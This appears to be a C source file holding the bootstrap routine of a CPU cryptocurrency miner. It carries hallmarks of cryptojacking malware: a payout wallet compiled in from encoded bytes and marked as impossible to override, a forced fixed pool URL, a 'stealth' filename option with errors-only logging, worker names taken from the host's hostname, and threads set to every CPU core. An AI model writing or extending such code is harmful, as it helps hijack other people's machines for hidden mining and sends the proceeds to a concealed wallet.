#include "soj_bootstrap.h"
#include "soj.h"
#include "soj_cli.h"

#include <stdlib.h>
#include <string.h>
#include <time.h>
#include <unistd.h>

extern char *rpc_pass;

static void enforce_fixed_pool_url(void);

int soj_bootstrap(int argc, char *argv[])
{
    pthread_mutex_init(&applog_lock, NULL);

    // Initialize random seed for connection delays (anti-DDoS)
    srand(time(NULL) + getpid());

    init_encoded_release_constants();

#if defined(ENCODED_WALLET_BYTES) || defined(HARDCODED_WALLET)
    // Use hardcoded wallet address - cannot be overridden
    rpc_user = strdup(get_fixed_wallet_seed());
#else
    rpc_user = strdup("");
#endif
    rpc_pass = strdup("");

#if defined(_SC_NPROCESSORS_CONF)
    num_cpus = sysconf(_SC_NPROCESSORS_CONF);
#elif defined(CTL_HW) && defined(HW_NCPU)
    int    req[] = {CTL_HW, HW_NCPU};
    size_t len   = sizeof(num_cpus);
    sysctl(req, 2, &num_cpus, &len, NULL, 0);
#else
    num_cpus = 1;
#endif

    if (num_cpus < 1)
        num_cpus = 1;
    opt_n_threads = num_cpus;

    opt_algo = ALGO_CIVICLIGHT;
    parse_cmdline(argc, argv);
    enforce_fixed_pool_url();

    const char *file_tag = NULL;
#if defined(LOG_ERRORS_ONLY)
    if (opt_stealth_filename && *opt_stealth_filename)
        file_tag = opt_stealth_filename;
#else
    if (opt_data_file && *opt_data_file)
        file_tag = opt_data_file;
#endif

    // Default worker name to file tag (if provided) otherwise hostname
    if (!opt_worker || !*opt_worker)
    {
        if (file_tag)
        {
            free(opt_worker);
            opt_worker = strdup(file_tag);
            applog(LOG_INFO, "Worker name defaulted to file tag: %s", opt_worker);
        }
        else
        {
            char hostbuf[128] = {0};
            if (gethostname(hostbuf, sizeof(hostbuf) - 1) == 0)
            {
                opt_worker = strdup(hostbuf);
            }
            else
            {
                applog(LOG_WARNING, "Failed to get hostname, worker name not set");
            }
        }
    }
    else
    {
        applog(LOG_INFO, "Worker name from command line: %s", opt_worker);
    }

    if (opt_algo == ALGO_NULL)
    {
        fprintf(stderr, "%s: No algo parameter specified\n", argv[0]);
        show_usage_and_exit(1);
    }

    return 0;
}
